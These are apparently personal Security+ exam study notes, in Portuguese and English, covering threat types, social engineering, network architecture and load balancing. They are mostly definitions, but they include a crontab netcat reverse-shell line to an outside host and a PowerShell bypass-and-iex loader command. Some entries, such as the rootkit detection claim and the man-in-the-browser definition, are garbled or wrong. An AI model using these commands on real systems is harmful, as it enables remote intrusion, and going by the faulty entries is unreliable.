# Conhecimentos adiquiridos após fazer testes

## Threats, Malwares and Common Vulnerabilities

1. **Shimming** is when the attacker places some malware between an application and some other file and intercepts the communication to that file (usually to a library or system API). In many cases, this is done with a driver for a hardware component.
2. **Refactoring** é o ato de refatorar o código(e o comportamento) do malware para ele não ser reconhecido em nenhum software anti-malware baseado em signature
3. “Cyberintelligence **fusion** is the process of gathering, analyzing, and then distributing information between disparate agencies and organizations. **Fusion centers** like those operated by the U.S. Department of Homeland Security (DHS) focus on strengthening shared intelligence activities.”
4. No sentido estrito da palavra, **malwares podem ser considerados PUPs**
5. “**White teams** act as judges and observers during cybersecurity exercises.”
6. “SOAR is a relatively new category as defined by Gartner. Security orchestration, automation, and response includes threat and vulnerability management, security incident response, and security operations automation, **but not automated malware analysis**.”
7. “**rootkits are more likely** to be detected by AV programs”
8. Principios da engenharia social:
      1. Familiarity
      2. Trust
      3. Scarcity
      4. Authority
      5. Urgency
      6. Intimidation
      7. Consensus, sometimes called social proof, is a social engineering principle that leverages the fact that people are often willing to trust groups of other people.
9. Polymorphic Virus é um Virus que muda sua forma a cada execução
10. Time-of-Check/Time-of-use é uma espécie de race condition
11. “Elicitation, or the process of eliciting information through conversation to gather useful information, is a key tool in a penetration tester’s social engineering arsenal.”
12. “A macro virus is a malicious script (macro) embedded into a file, typically a Microsoft Office file. They are typically written in Visual Basic for Applications (VBA) script”
13. “ Pharming attempts to redirect traffic intended for a legitimate site to another malicious site. Attackers most often do this by changing the local hosts file or by exploiting a trusted DNS server.”
14. Apesar de acharmos que um IP estrangeiro seja uma obrigatoriedade de uma APT “would attack from a foreign IP address, they often use a compromised address in the target country as a base for attacks”
15. Prepending : “Prepending is described by CompTIA as “adding an expression or a phrase,”. “Thus, you need to know that when it is used for this exam it can mean one of three things: adding an expression or phrase to an email, subject line, or headers to either protect or fool users. They also note that it can be used when adding data as part of an attack, and that social engineers may “prepend” information by inserting it into conversation to get targets to think about things the attacker wants them to.”
16. “Although auditing some libraries or libraries that are custom-developed for the code is common, auditing all libraries used in the code is unlikely except in exceptional situations.”
17. “A denial-of-service (DoS) attack may target a memory leak. If an attacker can induce the web application to generate the memory leak, then eventually the web application will consume all memory on the web server and the web server will crash.”
18. **Skimming** is stealing our credit card information as we use the card for some other purpose.
19. **Man in the Browser** Malware is used to change the client's computer network routing to perform a classic man-in-the-middle attack.
20. Botnets geralmente se conectam com o Command and Control via IRC, um protocolo antigo usado para Internet Relay Chat. Padrao do IRC de fato sempre foi executar o IRC em TCP 6667.
21. Calling their extension é ligar para o RAMAL. Vishing é Phishing de Voice, não de Video!
22. O arquivo /etc/passwd é um banco de dados de informações baseadas em texto sobre os usuários que podem logar no sistema ou outras identidades de usuários do sistema operacional que possuem processos em execução. Uma solução é um arquivo de senhas "sombra" (shadow) para armazenar os hashes de senha separados de outros dados no arquivo passwd legível globalmente. Para arquivos locais, ele normalmente é o /etc/shadow nos sistemas Linux e Unix
23. “Although Structured Query Language (SQL) queries are often parameterized, Lightweight Directory Access Protocol (LDAP) security practices focus instead on user input validation and filtering of output to ensure that an excessive amount of data is not being returned in queries”
24. “URL redirection has many legitimate uses, from redirecting traffic from no-longer-supported links to current replacements to URL shortening, but URL redirection was commonly used for phishing attacks. Modern browsers display the full, real URL, helping to limit the impact of this type of attack.”
25. Security orchestration, automation, and response (SOAR) services are designed to integrate with a broader range of both internal and external applications. Tanto SOAR quanto SIEM são automatizados, mas o SOAR é integrado para responder a ataques
26. “The U.S. Trusted Foundry program is intended to prevent supply chain attacks by ensuring end-to-end supply chain security for important integrated circuits and electronics.”
27. “Passwords in memory are often stored in plain text for use.”
28. Ao colocar uma URL como parametro de uma request: “This is an attempt to get the server to send a request to itself as part of an API call, and it is an example of server-side request forgery.”
29. “Hybrid warfare is a relatively new term that describes the multipronged attacks conducted as part of a military or national strategy of political warfare that uses traditional, asymmetric, and cyberwarfare techniques along with influence methods to achieve goals”
30. “Linux privileges can be set numerically, and 777 sets user, group, and world to all have read, write, and execute access to the entire /etc directory.”
31. “ISACs, são information sharing and analysis centers, ”
32. “CompTIA defines “maneuver” in the context of threat hunting as how to think like a malicious user to help you identify potential indicators of compromise in your environment.”
33. “Proprietary, or closed threat, intelligence is threat intelligence that is not openly available”
34. crontab -e 0 * * * * nc(NETCAT) example.com 8989 -e /bin/bash -> Esse comando faz uma reverse shell usando o crontab para fazer um netcat de hora em hora para se conectar a um dominio pela porta 8989 e permitir a execução do /bin/bash
35. powershell.exe -ep Bypass -nop -noexit -c iex -> Upload algo para a memoria
36. “The Security+ exam outline lists seven major impact categories, including data loss, data breaches, and data exfiltration. Data modification is not listed, but it is a concern as part of the integrity leg of the CIA triad”
37. Caso seu sistema esteja sendo acessado em diferentes portas, pode estar ocorrendo um Scan
38. A primeira coisa a se fazer ao identificar uma Vuln é acessar a CVE e ver as fixes


## Architecture and Design

1. SAN é sigla de Storage Area Network
2. Perfect forward secrecy (PFS) is used to change keys used to encrypt and decrypt data, ensuring that even if a compromise occurs, only a very small amount of data will be exposed
3. “warm site, which has some or all of the infrastructure and systems he needs but does not have data.”
4. “Storage area network (SAN) replication copies the contents of one repository to another repository, such as an organization’s central SAN environment to a remote SAN at the hardware or block level.”

# New Book

## Chapter 1

1. A jump server, jump host or jump box is a system on a network used to access and manage devices in a separate security zone
2. SSL passthrough is the action of passing data through a load balancer to a server without decrypting it
3. SSL termination is a process by which SSL-encrypted data traffic is decrypted (or offloaded)
4. IPV6 Link Local começam com FE80 enquanto IPV4 com 169.254, é o endereço unicast para se comunicar com a NIC
5. Protocolo de Descoberta de Vizinhos é um padrão do conjunto de protocolos de comunicação TCP/IP usado com o IPv6, que opera na camada de rede do modelo Internet, responsável por seguintes funções de configuração e descoberta: Autoconfiguração de endereço dos nós; Descoberta de outros nós na rede local


### Load Balancing
1. Health probes allows Load Balancers to detect the backend endpoint status.
2. Fixed Weighting is a load balancing algorithm where the administrator assigns a weight to each application server
3. Round Robin é um por vez
4. Least Connection é redirecionar para o que tiver menos
5. A reverse proxy accepts clients requests and forwards them to an internal host or hosts for processing, thus hiding the true identity of the internal host(s). É o termo mais proximo de Load Balancer

# Jason Dion

1. Em criptografia, RC4 era o algoritmo simétrico de criptografia de fluxo mais usado no software e era utilizado nos protocolos mais conhecidos, como Secure Socket Layers e WEP
2. Cain & Abel (frequentemente abreviado para Cain) é uma ferramenta de recuperação de senha para Microsoft Windows. Ele pode recuperar muitos tipos de senhas usando métodos como sniffing de pacotes de rede, decifrando vários hashes de senhas, por meio do uso de métodos como ataques de dicionário, força bruta e ataques de análise de criptografia.[1] Os ataques de criptoanálise são feitos através de tabelas de arco-íris, que podem ser geradas com o programa winrtgen.exe, fornecido com o Cain & Abel
3. MSSP vem da sigla em inglês Managed Security Services Providers. São empresas que proveem serviços gerenciados de segurança para outras empresas, através de um SOC – Security Operations Center. 

## SMURF ATTACK

A Smurf attack scenario can be broken down as follows:

1. Smurf malware is used to generate a fake Echo request containing a spoofed source IP, which is actually the target server address.
2. The request is sent to an intermediate IP broadcast network.
3. The request is transmitted to all of the network hosts on the network.
4. Each host sends an ICMP response to the spoofed source address.
5. With enough ICMP responses forwarded, the target server is brought down.
